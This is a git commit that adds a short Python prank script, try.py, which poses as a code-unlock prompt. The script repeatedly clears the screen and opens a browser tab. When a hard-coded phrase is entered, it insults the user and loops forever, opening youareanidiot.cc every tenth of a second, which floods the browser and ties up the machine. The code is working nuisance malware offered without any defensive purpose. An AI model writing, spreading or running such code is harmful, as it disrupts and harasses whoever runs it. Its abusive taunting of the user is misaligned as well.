86cfb2c08a736832da60c38db1167284ea1db5d0
destroyerLinuxPropaly <160316312+destroyerLinuxPropaly@users.noreply.github.com>
2024-04-21 21:10:56 +0700

    Add files via upload

---
+++ try.py
@@ -0,0 +1,30 @@
+#DONT ASK ME PLEASE
+#DO NOT RECORDER AND SETTINGS
+
+import sys
+import os
+import time
+import webbrowser
+m = "\033[1;91m"
+h = "\033[1;92m"
+
+while True:
+      try:
+        os.system("cls")
+        webbrowser.open("https://github.com/")
+        a = input(f"""{m}Enter The Code.txt before you unlock a missing
+Your Died >{h} """)
+        if a == "the world be were destroy" or a == 'i will die and into the darkness':
+          time.sleep(3)
+          print(f"{m}Well Done You open a file, this file are.....")
+          time.sleep(2)
+          while True:
+             print("A VIRUS YOUR ARE AN IDIOT HAHA, YOUR VERY VERY IDIOT IDIOT")
+             webbrowser.open("https://youareanidiot.cc/")
+             time.sleep(0.1)
+        else:
+           time.sleep(5)
+           print("Wrong input idiot!")
+           time.sleep(1)
+      except Exception as e:
+           raise(e)
